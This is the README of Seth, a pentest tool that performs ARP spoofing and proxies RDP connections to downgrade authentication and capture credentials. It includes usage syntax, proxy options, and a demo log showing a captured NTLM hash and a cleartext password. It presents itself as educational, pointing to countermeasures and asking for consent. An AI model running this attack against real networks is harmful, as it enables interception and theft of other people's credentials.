Seth
====

Seth is a tool written in Python and Bash to MitM RDP connections by
attempting to downgrade the connection in order to extract clear text
credentials. It was developed to raise awareness and educate about the
importance of properly configured RDP connections in the context of
pentests, workshops or talks. The author is Adrian Vollmer (SySS GmbH).

Usage
-----

Run it like this:

    $ ./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP|HOST IP>

Unless the RDP host is on the same subnet as the victim machine, the last IP
address must be that of the gateway.

The script performs ARP spoofing to gain a Man-in-the-Middle position and
redirects the traffic such that it runs through an RDP proxy. The proxy can
be called separately:

    $ ./rdp-cred-sniffer.py -h
    usage: rdp-cred-sniffer.py [-h] [-d] [-p LISTEN_PORT] [-b BIND_IP]
                               [-g {0,1,3,11}] -c CERTFILE -k KEYFILE
                               target_host [target_port]

    RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017

    positional arguments:
      target_host           target host of the RDP service
      target_port           TCP port of the target RDP service (default 3389)

    optional arguments:
      -h, --help            show this help message and exit
      -d, --debug           show debug information
      -p LISTEN_PORT, --listen-port LISTEN_PORT
                            TCP port to listen on (default 3389)
      -b BIND_IP, --bind-ip BIND_IP
                            IP address to bind the fake service to (default all)
      -g {0,1,3,11}, --downgrade {0,1,3,11}
                            downgrade the authentication protocol to this (default
                            3)
      -c CERTFILE, --certfile CERTFILE
                            path to the certificate file
      -k KEYFILE, --keyfile KEYFILE
                            path to the key file

For more information read the PDF in `doc/paper` (or read the code!). The
paper also contains recommendations for counter measures.


Demo
----

The following ouput shows the attacker's view. Seth sniffs an offline
crackable hash as well as the clear text password. Here, NLA is not enforced
and the victim ignored the certificate warning. The client is Windows 7 and
the Server Windows 10.

    # ./seth.sh eth1 192.168.57.{103,2,102}
    ███████╗███████╗████████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
    ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
    ╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
    ███████║███████╗   ██║   ██║  ██║   https://www.syss.de
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
    [*] Spoofing arp replies...
    [*] Turning on IP forwarding...
    [*] Set iptables rules for SYN packets...
    [*] Waiting for a SYN packet to the original destination...
    [+] Got it! Original destination is 192.168.57.102
    [*] Clone the x509 certificate of the original destination...
    [*] Adjust the iptables rule for all packets...
    [*] Run RDP proxy...
    Connection received from 192.168.57.2
    Downgrading authentication options from 11 to 3
    Enable SSL
    alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000
    Tamper with NTLM response
    TLS alert access denied, Downgrading CredSSP
    Waiting for connection
    Connection received from 192.168.57.2
    Enable SSL
    Connection lost
    Waiting for connection
    Connection received from 192.168.57.2
    Enable SSL
    Hiding forged protocol request from client
    .\alice:ilovebob
    Keyboard layout/type/subtype: 0x20409/0x7/0x0
    Key release:                 Tab
    ^C[*] Cleaning up...
    [*] Done.


Requirements
------------

* `python3`
* `tcpdump`
* `arpspoof`

  `arpspoof` is part of `dsniff`
* `openssl` < 1.1.0f

  OpenSSL should not be too recent, as it does not support older versions of
  the SSL protocol and thus may be incompatible with older version of the
  Windows RDP client.


Disclaimer
----------

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
